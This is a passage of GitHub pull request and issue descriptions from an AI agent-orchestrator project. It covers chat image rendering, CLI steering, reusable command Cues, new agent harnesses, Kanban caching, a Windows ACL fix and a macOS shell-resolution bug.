pass through exactly as before, so existing transcripts render the same. The `img-src https:` beacon concern is described in #5381 and needs its own change. - `data:` images are still dropped by react-markdown's default `urlTransform`, as today. **Overlap with #5384:** both PRs touch the same `img` override in `ChatMarkdown.tsx` and add cases to `ChatMarkdown.test.tsx`, so they conflict with each other. That PR replaces the override with a thumbnail and dialog component (`ChatImage`). They stay independent PRs against `main`. Whichever merges second will be rebased onto the new `main`: `ChatImage` reads its `src` through `useChatImageSrc`, and `ChatMarkdownImage` is removed. ## Testing TDD: 4 new cases in `ChatMarkdown.test.tsx` and 1 in `ChatWorkspace.test.tsx`, run against a no-op provider first. - Red: the relative-path, root-clamping, and `ChatWorkspace` wiring cases failed. - Guards: the absolute-source and outside-a-session cases already passed and still pass. - Green: all five pass after the implementation. Mirrored the `Frontend` workflow locally on Node 24.19.0 with `npm ci`: - `npm run typecheck` ✅ - `npm run typecheck:e2e` ✅ - `npx vitest run` with `TZ=UTC`: 313 files passed, 4564 tests passed, 7 skipped ✅ - `CI=true npm run test:e2e:renderer`: 59 passed ✅ - `packages/cloud-client`: `npm run generate` with no `src/schema.ts` diff, typecheck, and 21 tests ✅ - `packages/product-ui`: typecheck and 126 tests ✅ - `src/landing`: `icons:check` ✅ - `mac-update-helper` on macOS: node tests (4 and 9 passed), x64 and arm64 helper builds with `lipo -verify_arch`, and the Swift state tests ✅ Note: `RestartToUpdateDialog.test.tsx > shows what the build changes` fails when the suite runs in a non-UTC timezone (seen in JST). It passes with `TZ=UTC`, which CI uses, and it is unrelated to this change. ### Screenshots An assistant message containing `![Saved screenshot](docs/screenshot.png)`, before and after: | Before | After | | --- | --- | | | | How these were captured: I could not run an isolated Electron instance on this machine. The only Go toolchain is 1.20.5, while the daemon requires 1.25.7, and there is no chat agent or fake chat driver to produce assistant messages. Instead, the screenshots come from the renderer's `dev:web` harness with the e2e fake bridge, the same setup as the `renderer-smoke` job. They use a mocked conversation with neutral test images and a local-only spec that is not committed. "Before" is `84fb98e3f`, the merge base of this PR. Since then, #5334 changed link handling in `ChatMarkdown.tsx` and `ChatWorkspace.tsx`, and this branch was rebased onto it. Neither change touches image rendering, so the before and after images still match. In the harness, the `workspace/file/blob` response is mocked. The screenshot therefore shows that the renderer resolves the relative path to the blob route; the daemon side of that route is unchanged by this PR. Not run locally: - gitleaks (binary unavailable on this machine); relying on CI. - `Prepare pinned agent-browser runtime` step: not run; it only matters for the agent-browser tests. ## Checklist - [x] Branched from `main` (or continuing an existing PR branch) - [x] One focused change; links the related issue when applicable - [x] Follows [AGENTS.md](https://github.com/AgentWrapper/agent-orchestrator/blob/main/AGENTS.md) conventions and PR hygiene - [x] Tests added/updated for user-visible behavior where it makes sense - [x] Relevant CI checks pass for the area touched (`go`, frontend, etc.) 🤖 Generated with [Claude Code](https://claude.com/claude-code)

title: feat(cli): add ao send steering mode for active Chat UI turns
body:
> *This was generated by AI during triage.*

## Request

Add an explicit steering mode to `ao send` for Chat UI sessions, for example:

```sh
ao send --session <id> --steer --message "Stop the current approach and use this correction."
```

While the agent is working, deliver this as steering input to its active turn through the Chat UI/provider steering path, rather than queueing an ordinary message for a later turn.

## Why

Queued corrections arrive too late. During coordinated work, agents continue following superseded instructions and send stale progress updates because the new instruction is waiting behind their active turn. The orchestrator needs the CLI equivalent of steering a running Chat UI conversation.

The installed `ao send --help` currently exposes only `--session`, `--message`, and `--help`.

## Expected behavior

- An explicit flag selects active-turn steering; preserve ordinary queued-send behavior when omitted.
- Reuse the existing Chat UI steering semantics and supported provider capability rather than implementing terminal keystroke injection.
- An idle Chat session accepts the message as its next normal turn.
- If the provider or session mode cannot steer, return an explicit unsupported result. Do not silently queue and claim it was steered.
- Distinguish daemon acceptance from actual provider delivery. Do not claim an agent read or acted on a message merely because the CLI returned successfully.
- Preserve message attribution and ordering; avoid duplicate delivery or an extra queued turn for the same steering message.
- Verify busy, idle, unsupported-provider, and failure cases with focused tests.

`--steer` is an illustrative name. A flag named only `--no-wait` could describe CLI blocking without changing delivery semantics; the requested capability is steering the running agent.

Related: #3634 documents delayed delivery to busy workers. This issue scopes the explicit CLI-to-Chat-UI steering control. No polling mechanism is requested.

title: feat: add reusable cues with fresh command terminals
body:
Code changes: +2553 -37  
Tests: +2877 -14  
Others: +1533 -3

Project workflows repeatedly need the same agent instructions and terminal commands. This PR adds reusable, project-local Cues. Agent Cues use AO's existing session delivery path. Command Cues send their exact command to a normal shell terminal in the selected project or session, without creating, messaging, or blocking an agent session.

## What changed

- Add Cue create, edit, invoke, delete, and detail read under Project Settings, with a runner in the project and session topbars. The runner appears only for resolved local daemon projects.
- Keep explicit agent targets strict: missing, wrong-project, terminated, exited, or blocked sessions fail without spawning a replacement. Project-level agent invocation creates a worker.
- Every command Cue invocation opens a fresh normal terminal. A shell-specific first-prompt hook signals readiness before the exact command is sent once. Unsupported shells, startup timeouts, shell exits, and cancellation never receive an automatic command; the terminal remains open and the API returns CUE_SHELL_NOT_READY when readiness cannot be verified.
- Session invocation selects the returned terminal through SessionView, clearing the active file and reviewer chat. Project invocation navigates to the terminals screen.
- Restrict command dispatch to the loopback daemon; authenticated LAN requests receive the existing forbidden error envelope. Restore the browser status operation's 403 contract.
- Bound request bodies, reject trailing JSON, normalize inactive fields on save, and validate UTF-8 byte limits. Preserve existing Cue definitions and full-definition update behavior.
- Merge current upstream main without rewriting shared PR history. Move the unreleased Cue migration to 0163 after upstream's 0161 automation and 0162 PR-discussion migrations, and repair preview databases that recorded Cues at 0149, 0155, 0156, 0159, 0161, or 0162. Regenerate OpenAPI, frontend types, and sqlc output.
- Remove the superseded Cue-specific ConPTY one-shot command line path while retaining normal interactive terminal behavior.
- Add agent-facing ao cue create/list commands and packaged using-ao guidance. Orchestrators and workers can save a repeatable agent instruction or exact shell command in their project; the CLI exposes no Cue edit or delete command.

## Validation

- On head 70386b545: Go build, Go vet, focused Cue/controller/API/spec/storage/ConPTY tests, all 294 targeted frontend component tests, frontend typecheck, Windows Electron package build, generated API and sqlc checks, and the native Windows ConPTY readiness test for PowerShell, pwsh, cmd, and Git Bash passed.
- On head 49b228425: focused Cue CLI, skill-packaging, and telemetry tests; all 49 focused Settings/Cue component tests; full Go vet; backend build; frontend typecheck; and Windows Electron package build passed. The full local Windows Go suite still has unrelated platform and environment failures. A targeted Go race run cannot start with CGO disabled. Docker is unavailable on this host.
- The complete local Windows Go and frontend test suites do not pass. The Go failures include Unix-specific tools or path assumptions, Windows filesystem permissions, and existing controller tests unrelated to Cue routes. The frontend suite on 49b228425 reports 22 failing files (177 tests), including macOS artifact checks and locale-sensitive assertions; 317 files passed (5230 tests). The focused Cue suites pass.
- The complete Go race suite cannot run locally because this Windows checkout has CGO disabled and no gcc compiler. Docker is unavailable locally, so the container workflow cannot run here. Linux and macOS jobs require their native remote runners.
- All 14 remote CI checks passed on head 49b228425, including the full Go race suite, full frontend test job, native macOS/Linux/Windows checks, lint, container, contract drift, and Windows workspace validation. The native desktop app launched with isolated AO data; project and session Cue controls were visible. Its daemon ran project and session command Cues, created the expected proof files in the project root and session worktree, and listed the new session terminal. UI overlay selection and prompt placement remain covered by focused tests rather than a completed visual walkthrough.

## Compatibility and limits

The existing Cue routes, stored definitions, and full-definition update behavior remain. The unmerged preview-only `preferredTerminalHandleId` request field is removed; invocation still returns a typed agent or command result. Agent behavior is unchanged. A command dispatch means the shell accepted the instruction; it does not prove command completion. Live cross-client synchronization, execution history, durable retry deduplication, scheduling, and import/export remain outside this PR.

## Review follow-up

- Address the six review findings: restore Cue detail GET, hide nonlocal runners, select session Cue terminals, wait for first-prompt shell readiness, restore browser-status 403, and remove the superseded ConPTY one-shot path.
- Keep cached Cue menu entries visible during refresh while requiring a successful refresh before invocation; disable invalid session targets.
- Retain upstream daemon, filesystem, GitHub, API, locale, styling, cloud, and browser changes during the merge.
- No originating GitHub issue is discoverable; @AgentWrapper was asked to confirm or link the pre-implementation approval [here](https://github.com/Untrivial-ai/agent-orchestrator/pull/5391#issuecomment-5750296224).

title: [Feature]: Command Code (cmd) as a supported harness
body:
### Problem

As an AO user whose day-to-day coding agent is **Command Code** (`cmd`, https://commandcode.ai), I cannot run it as an AO worker or orchestrator harness. `ao spawn --harness` only accepts the built-in catalog (claude-code, codex, opencode, kimi, pi, muse, …) and I found no way to register a custom CLI, so Command Code sessions can't be supervised on the Kanban, routed CI/review feedback, or spawned by an orchestrator. This affects anyone whose Command Code subscription is their primary model route (it fronts DeepSeek, GLM, GPT, Gemini, Grok and others behind one account).

Command Code already exposes everything a harness integration seems to need:

| Need | Flag |
|---|---|
| headless run | `-p, --print [query]`, `--output-format json` (NDJSON event stream + final result line) |
| bypass permissions | `--yolo` (alias for `--dangerously-skip-permissions`), `--permission-mode standard\|plan\|auto-accept` |
| model / effort | `-m, --model <provider/model>`, `--effort <low\|medium\|high\|max>` |
| resume | `-r, --resume [id]`, `-c, --continue`, `--session <path\|id>`, `--fork-session` |
| worktrees | `-w, --worktree [name]` |
| automation hygiene | `--skip-onboarding`, `--no-auto-update`, `-t, --trust`, `--no-session` |
| MCP | `cmd mcp …` |

Tested with Command Code 1.54.0 on Linux x64, Node 24; AO desktop build `dev` (daemon reports `ao version` = dev).

### Proposed direction

Add `command-code` (binary `cmd`) to the harness catalog with the same shape as the other CLI-driven harnesses: launch `cmd -p --output-format json --yolo -m <model> --effort <effort>` in the session worktree for Chat mode, plain `cmd` in TUI mode, map AO permission modes to `--permission-mode`/`--yolo`, and map the AO model override to `-m`. Readiness check: `cmd status` (prints "Authentication verified" when logged in). `cmd --list-models` returns the model catalog for the model picker.

### Alternatives considered

- Running `cmd` outside AO and pointing AO at the worktree: loses spawn/kanban/review routing entirely.

title: fix: preload session usage before first Kanban render
body:
## Problem

On the first visit to a Kanban board after launching AO, session token/cost badges appear after the cards have already rendered. Navigating away and back does not reproduce the flash.

## Cause

The shell route preloads the workspace/session query, but the board starts `useSessionUsageSummaries(projectId)` only after `SessionsBoard` mounts. On a cold query cache, the board substitutes an empty usage map, renders cards without usage, and rerenders when `GET /api/v1/usage/sessions` completes.

Subsequent visits render cached usage immediately (including while a stale query refetches), which explains why this is first-visit-only.

The endpoint is moderately more expensive than the sessions endpoint because it aggregates persisted usage events by session, but there is no remote pricing lookup or heavy renderer-side calculation. In a representative local database with about 9,900 usage events, the request was typically around 25 ms with cold/contention spikes around 175 ms.

## Proposed fix

Make usage summaries a data dependency of both Kanban routes so the query cache is populated before `SessionsBoard` mounts:

- project board: preload the project-scoped usage summary
- all-sessions board: preload the all-project usage summary

Reuse `sessionUsageQueryOptions` so the route loader and component share the same cache key and query function.

## Acceptance criteria

- Token/cost badges are present on the Kanban's first rendered frame when usage exists.
- Project boards request project-scoped summaries.
- The all-sessions board requests all summaries.
- Later event-driven invalidation and background refresh behavior remains unchanged.

title: fix: show Kanban cost badges on the board's first frame
body:
## Summary

Kanban cards painted before their cost badge (for example `$0.92` next to "Awaiting PR"), and the cost filled in up to ~2s later. This PR makes the cost appear in the same frame as the cards:

- **Warm every board's usage before it's opened, with one request per host.** `warmSessionUsageSummaries` fetches the host-wide `GET /api/v1/usage/sessions` once and splits it into each project's board cache, using the sessions the workspace list already knows.
  - On a normal launch, local boards are warmed from the `_shell` loader, which never waits for it.
  - `ShellLayout` also warms whenever a host's project list becomes known: local once the workspace query succeeds, remote once that host's sessions load. This covers a daemon that becomes ready after the loader returned early, recovery fetches, new projects, and remote hosts. The effect is keyed on the project set, so streamed session updates don't re-run it, and overlapping warm-ups share one in-flight request.
  - Boards that already have data are skipped, including a board that loaded while the warm-up was in flight.
  - Seeded entries keep the response's timestamp, so a board opened later still refreshes once that data is older than 10 s.
  - A failed warm-up is a single attempt; the board's own query fetches (with its usual retry) when it opens.
- **Keep usage summaries cached across board visits** (`gcTime: Infinity` on `sessionUsageQueryOptions`). Before, React Query dropped the entry 5 minutes after the board unmounted, so every later visit painted the cards first again. Freshness is unchanged:
  - Usage writes (`ApplyUsageChunk`, `ApplyUsageCostUpdates`) touch `usage_bindings`, whose CDC trigger emits `session_updated`. The event transport then invalidates `sessionUsageQueryRoot`.
  - An open board refetches right away. A cached board shows its cached cost and refetches when it next mounts.
- **Remove the board route loaders** added earlier in this PR (see "Why the route loader was dropped").

Closes #5399

## Measurements

Real Electron dev app driven over CDP, isolated data: 111 sessions across 2 projects, 13.7k usage events on the measured board's project. "Cards" and "cost" are the first DOM frames with a card and with a `$` amount on the board. Times are ms from navigation, or from reload for cold reloads. Before and after were measured on the same data.

| Scenario | Before (main) | Route loader (previous head) | This PR |
|---|---|---|---|
| First board visit after launch | cards 368–423, cost **+276–287** | cards **774–796** (blank content until then), cost same frame | cards 367–419, cost **same frame** |
| Cold reload onto the board | cards 970–1037, cost **+385–427** | cards 1186–1358, cost **+320–440** | cards 990–1032, cost **same frame** |
| Revisit after the cache was collected | cards 213–258, cost **+160–270** | cards 170–240, cost **+165–195** | cards 249–338, cost **same frame** |
| Revisit after 5.5 real minutes away | (cache collected, as above) | (cache collected, as above) | entry kept, cost **on first frame** |

The route-loader column was measured earlier on the 91-session single-project lab.

Startup requests (2 projects): this PR sends exactly one `/usage/sessions` request. Opening each board shows its cost on the first frame, then refreshes that project in the background.

Where the gap came from (traced with React Query cache events and CDP network timing):
- **Not request queueing.** Each card's `/sessions/{id}/pr` takes about 2 ms, even on a real 122-session daemon.
- The usage response arrives 30–60 ms after it's sent, but React Query only gets it 200–400 ms later because the main thread is busy rendering 91 cards. A second full render then paints the cost.
- On a real daemon, the endpoint itself often takes 0.35–0.65 s (see Follow-up). That stacks on top of the above and is consistent with the reported ~2s. With this PR it's hidden: the cached cost renders immediately and the refetch runs in the background.

## Why the route loader was dropped

Disabling retries (the earlier review fix) removed the backoff stall, but measurement showed three structural problems:
1. **The first visit waits on the loader.** The router has `defaultPendingMs: 0` and the pending component renders nothing after startup, so the board's content area stays blank until usage resolves (~790 ms vs ~380 ms). That's the wait moved in front of the board, which is what broke the focus smoke spec.
2. **Revisits get nothing.** The router reuses the cached match and reruns the loader in the background, so cards still paint before the cost.
3. **Cold start gets nothing.** Child loaders run in parallel with the `_shell` daemon probe, so the usage loader runs before the API base URL exists and fails instantly with the synthesized 503.

## Tests

- `useSessionUsageSummaries.test.ts`:
  - one host-wide request fills every project board; the standalone workspace is skipped; empty projects get `[]`;
  - seeded entries carry the response's `dataUpdatedAt` (the test uses a ticking clock, and fails if the stamp is dropped);
  - remote hosts are warmed through `clientForHost`;
  - no request when every board is cached;
  - a board that loads mid-warm-up keeps its own data;
  - a failed warm-up is one attempt, leaves boards empty so they fetch themselves, and the board query keeps `retry: 1`;
  - `gcTime` is infinite.
- `shell-new-session-shortcut.test.tsx` (51/51):
  - the `_shell` loader resolves without waiting for the warm-up (the warm-up never settles in that test);
  - a daemon that becomes ready after the loader ran still warms local boards (fails on the previous shell code);
  - remote boards are warmed only after the host's sessions load, and not again for streamed session updates.
- `useSessionUsageSummaries.test.ts` also covers overlapping warm-ups sharing one request (9/9).
- 264 tests across the shell, board, archive, notification, memory and remote-workspace suites; `npm run typecheck`; `npm run typecheck:e2e`.
- Renderer smoke locally: 73/75 (`cross-platform-focus` 3/3). Both failures are in `chat-composer-text-selection`: the pointer-drag spec fails consistently on macOS and passed in CI on the previous push; the caret spec passes when rerun alone. `smoke-board`'s "narrow card status truncates" (`@BRD`, not in the CI smoke set) also fails locally on the previous head, without this change.
- Real Electron, same lab:
  - Cost updates while the board is open: a new usage event plus binding touch changed `$26.97` → `$31.97` within 3 s.
  - A change made while away shows on revisit.
  - Usage endpoint failing at startup: one warm-up attempt. Once it recovered, opening the board showed the cost 9 ms after the cards.
  - One startup request for two projects; both boards show cost on their first frame.
  - The cache survives 5.5 minutes away.
  - Late daemon: stopped the daemon, reloaded the renderer, then used **Restart daemon**. The previous push warmed nothing and the board's first frame had no cost; this PR warms both boards as soon as the daemon is ready, and the first frame shows the cost.
- Remote warm-up is covered by unit and shell tests only. Exercising it in the app needs a remote host's network listener, which I didn't open on this machine.

## Risks

- Usage summaries are no longer garbage-collected. There's one entry per project and host plus one host-wide entry, and they're small (~25 KB for 120 sessions).
- Seeding relies on the workspace list's session IDs. A session created after that snapshot emits `session_updated`, which marks the seeded entry stale, so the board refetches it on open.

## Follow-up (not in this PR)

The real daemon's 0.35–0.65 s for `/usage/sessions` is not daemon code. The handler is the SQL plus a JSON map. Sampled every 20 s on a 1.2 GB `ao.db`:
- The same SQL in a fresh `sqlite3` process took 0.40–0.80 s of wall time but only ~20 ms of CPU.
- The daemon, called right afterwards, took 28–115 ms.
- Through modernc (the daemon's driver): 390 ms cold, 21 ms warm.

The time is disk reads. The 13.9k `model_usage_events` rows are scattered across a database dominated by `conversation_provider_events` (~780 MB), and the OS evicts them from its file cache between visits on a memory-pressured machine. Possible backend fixes: a covering index for the compact aggregate, or a per-session usage rollup.

title: fix: suppress false exit on planned shutdown and stabilize sidebar order
body:
## Problem

Two issues on daemon restart / controller reconnect: (1) a planned shutdown reported `ActivityExited`, flashing a false "exited" state on sessions that were only being closed normally, and (2) the sidebar sorted by `updatedAt`, which the backend bumps on every controller lifecycle event, so staggered reconnect waves visibly reshuffled the list.

## Fix

Backend: a planned controller `Close` (the only caller is `Service.StopAll`, used for shutdown) sets a `plannedStop` flag so `project()` suppresses the `ActivityExited` report; a genuine stream loss still reports exited. Frontend: the sidebar comparator sorts by the immutable `createdAt` (with `id` tiebreak) instead of `updatedAt`/`lastActivityAt`, so connectivity and activity churn can no longer reorder rows.

Behavior note for review: rows no longer bubble to the top on activity; ordering is now stable by creation. That is intentional per the issue but is a visible UX change.

title: feat(codex): installer-aware Codex CLI update flow
body:
## Problem

AO's "Codex CLI update available" story was not installer-aware. It could not tell whether the `codex` binary came from an npm global, Homebrew, or a standalone install, so it could not offer a correct update action; a generic command risks running the wrong install path and breaking the binary.

## Fix

Backend: a `CodexMaintenanceStatus` advisory resolves the live `codex` binary, classifies its ownership (npm prefix / Homebrew Cellar-Caskroom / standalone) with a pure, unit-tested classifier, compares installed vs latest, and produces an ownership-correct update command (or a manual-only reason). Two new endpoints (`GET /api/v1/agents/codex/maintenance`, `POST .../maintenance/update`) reuse the existing async job pipeline, with a 409 `CODEX_OWNERSHIP_CHANGED` guard against stale advisory state and a 60s server-side cache. Frontend: a `CodexMaintenanceRow` in the Codex settings section shows nothing when up to date, an "Update now" action when supported, live job progress, and a manual-only message otherwise. Localized across all 8 locales.

## Changes

title: Qwen TUI to Chat handoff (AgentInterfaceHandoff)
body:
Qwen sessions are stuck in the interface they are born in. The tab toggle reports `INTERFACE_HANDOFF_UNSUPPORTED` because the Qwen TUI adapter does not implement `AgentInterfaceHandoff`. Codex, Claude Code, and OMP already do.

## Evidence it is buildable (Qwen 0.23.4, verified live)

- Qwen keeps one session store shared by TUI and ACP: `~/.qwen/projects/<hash>/chats/<uuid>.jsonl`.
- `session/load` with a TUI-created session id over raw ACP replayed the full transcript.
- `session/prompt` on the loaded session streamed a live reply. The adopted session is resumable, not a playback.
- Same shape as Codex, whose handoff works today: same native id on both surfaces.

## Acceptance criteria

- [ ] Qwen TUI plugin implements `AgentInterfaceHandoff`: TUI side returns the hook-reported agent session id, Chat side returns the provider conversation id.
- [ ] Optional `NativeConversationExists` probe against `chats/<id>.jsonl` under `QWEN_HOME`, mirroring the Codex rollout walk.
- [ ] Handoff launch path loads (`session/load`) the native id instead of `session/new`.
- [ ] Mode mismatch handled: a yolo-born TUI session loaded into Chat must `set_mode` to the Chat settings and verify it, never silently stay permissive.
- [ ] Trust-gated folders: a silent `set_mode` failure must fail the switch, not leave a permissive session behind.
- [ ] Fresh sessions with no persisted file take the safe-fresh path via the history probe.
- [ ] Chat to TUI reverse (`--resume` on an ACP id) verified or explicitly scoped out.
- [ ] Tests in the Codex handoff style; no changes to generic machinery beyond a narrow load-vs-new option if needed.

## Risks being tracked

Mode mismatch, trust-gate silent failures, unpersisted fresh sessions, unverified reverse direction. Details in the Codex pattern at `backend/internal/adapters/agent/codex/codex.go`.

title: fix(agent): trust CodexSandboxUsers group for local Codex auth on Windows
body:
## Description

Fixes #[5306](https://github.com/Untrivial-ai/agent-orchestrator/issues/5306)

This PR resolves an issue on Windows where local Codex authentication failed with an `account_storage_unsafe` (HTTP 503) error when the `~/.codex` directory permissions were checked. 

The official Codex client automatically adds the `CodexSandboxUsers` group to the `~/.codex` directory. Because AO's internal security policy uses a strict whitelist (only allowing the current user, SYSTEM, and Administrators), it treated this sandbox group as unsafe and triggered a circuit breaker.

### Changes Made
- Updated the Windows-specific secure filesystem checks in `backend/internal/service/agent/codex_secure_fs_windows.go`.
- Added dynamic resolution for the `CodexSandboxUsers` group's SID using `windows.LookupSID`.
- Added the `CodexSandboxUsers` SID to the whitelist for both trusted owners (`ownerTrusted`) and Access Control Entries (`PrincipalTrusted`).

title: feat(cloud): redesign project onboarding flow and GitHub PAT integration

It handles all edge cases for repository access and provides a much smoother user experience for importing and configuring cloud projects. ## Why Frictionless User Journey: The previous project creation flow was disjointed. We needed a unified, step-by-step UI that feels native to the application and guides the user seamlessly through the setup process. Simplified Authentication: Users needed a persistent, global way to configure their GitHub Personal Access Token (PAT) so they don't have to repeatedly authenticate for different projects. Accurate Repository Validation: The application needs to definitively verify if a user has push access to a repository (including organization and third-party repos) before provisioning cloud resources, preventing frustrating failures later in the pipeline. ## How Redefined Onboarding UI: Completely overhauled the CreateProjectFlow.tsx interface into a clean state machine. Organization and third-party repositories are now accurately verified against the GitHub API (permissions.push) rather than relying on flawed ownership heuristics. title: bug(daemon,desktop): Finder/Dock launch inherits launchd's generic $SHELL=/bin/sh, breaking session shells and hooks that need the real login shell
body:
## Bug

When AO Desktop is launched from Finder/Dock (macOS) rather than a Terminal, the process is started by `launchd`, which does not export the user's real login shell in `$SHELL` — it leaves it unset or sets the generic `/bin/sh`. AO trusts that value as-is wherever it is non-empty, so:

- Agent sessions (Claude Code, etc.) spawned inside AO's tmux panes run their shell as `/bin/sh` instead of the user's actual shell (e.g. `/bin/zsh`).
- Standalone shell terminals opened from the AO desktop app do the same.
- Because `/bin/sh` never sources `.zshrc`/`.bashrc`, anything only on `PATH` via an interactive-shell init (nvm, mise, etc.) is invisible inside AO — e.g. `node: command not found` even though `node` works fine in a normal Terminal window.

Running the same AO build/session **launched from a Terminal** does not show the problem, because the Terminal's own shell already has a correct `$SHELL`, and that correct value is what gets inherited — confirming this is specifically about the Finder/Dock launch path, not AO's shell-handling logic in general.

**Analyzed against:** `d6fd5e5f` (`origin/main`)
**AO version:** `dev` (local build)
**OS:** macOS 15 (Darwin 25.2.0), arm64
**Confidence:** High — traced to exact call sites, and independently confirmed that `dscl . -read "$HOME" UserShell` returns the correct `/bin/zsh` on the affected machine even while the AO-inherited `$SHELL` is `/bin/sh`.

## Reproduction

1. On macOS, install/build AO Desktop and launch it via Finder or the Dock (not from a Terminal).
2. Open a standalone shell terminal, or start any agent session (e.g. Claude Code).
3. Inside that shell/session, check the shell in use (e.g. via a Stop/session hook that shells out, or `ps -p $$`) — it resolves to `/bin/sh`, not the user's configured login shell.
4. Anything that depends on interactive-shell PATH setup (nvm-managed `node`, mise shims, etc.) fails with "command not found," even though the same command works in a normal Terminal window on the same machine.

## Root Cause

`$SHELL` is read and trusted directly, with no correction for the launchd GUI-launch case, in at least these places:

- `frontend/src/shared/shell-env.ts:149-151` — `resolveShellPath()` only falls back to `/bin/zsh` when `env.SHELL` is *empty*; a non-empty `/bin/sh` from launchd is accepted as-is.
- `frontend/src/main.ts` → `buildDaemonEnv()` (`frontend/src/shared/shell-env.ts:183-192`) — merges `{ ...shellEnv, ...processEnv }`, so Electron's own `process.env.SHELL` (the launchd-supplied `/bin/sh`) wins over any recovered login-shell env, and this becomes the `SHELL` the Go daemon inherits.
- `backend/internal/adapters/runtime/tmux/tmux.go:290-296` (`New()`) — `shellPath = getenv("SHELL")`, falling back to `/bin/sh` only when empty. This is the shell used for agent-session tmux panes.
- `backend/internal/service/shellterm/loginshell.go:22-35` (`resolveUserLoginShell()`) — same pattern for standalone shell terminals; PATH-based `zsh`/`bash`/`sh` lookup only triggers when `$SHELL` is empty, not when it's the generic `/bin/sh`.

None of these distinguish "the user's real shell happens to be `/bin/sh`" (rare) from "launchd assigned the generic default because this was a GUI launch" (common), so the second case is silently treated as the first.

## Fix

Prototyped and locally verified: added a small `backend/internal/usershell` package with `PreferOverGeneric(envShell string) string`, which only acts when `envShell == "/bin/sh"` — on macOS it consults Directory Services (`dscl . -read <home> UserShell`), the same source Terminal.app and the login window use, and returns that value when it differs from the generic default; otherwise it returns `envShell` unchanged. Wired into `tmux.go`'s and `loginshell.go`'s shell-resolution call sites. Verified on the affected machine that `PreferOverGeneric("/bin/sh")` correctly returns `/bin/zsh`. All existing tests in the touched packages still pass; new tests cover the `usershell` package.

Not yet opened as a PR — happy to push it if a maintainer confirms this is the right approach (vs. e.g. fixing the frontend's `buildDaemonEnv` merge order instead/also, which would fix it at the source before it ever reaches the Go daemon).

## Related

- [#3788](https://github.com/Untrivial-ai/agent-orchestrator/issues/3788) — same `tmux.go` shell-resolution area (`$SHELL` trusted directly), different symptom: `fish` breaks the POSIX prelude script. Worth reconciling any fix together, since that issue's suggested fix (force `/bin/sh` for the internal prelude) and this one (avoid an incorrect `/bin/sh` for the interactive shell) touch the same code but pull in different directions.
- [#2812](https://github.com/Untrivial-ai/agent-orchestrator/issues/2812) — same root class of bug ("Electron has a PATH floor, Go daemon does not"): the daemon inherits a GUI launcher's minimal environment and doesn't correct for it, there for `tmux` binary lookup rather than `$SHELL`.
- [#2832](https://github.com/Untrivial-ai/agent-orchestrator/issues/2832) (closed) — explicitly documents the same trigger ("the daemon runs inside the Electron process and inherits a minimal PATH from the GUI launcher — it does not source shell rc files") for nvm-installed agent binaries specifically.
- [#4505](https://github.com/Untrivial-ai/agent-orchestrator/issues/4505) (closed) — added a selectable default shell for standalone terminals, but Windows-only (`git-bash`/`pwsh`/`powershell`/`cmd`); macOS has no equivalent override today, so this class of bug currently has no user-facing workaround on macOS either.
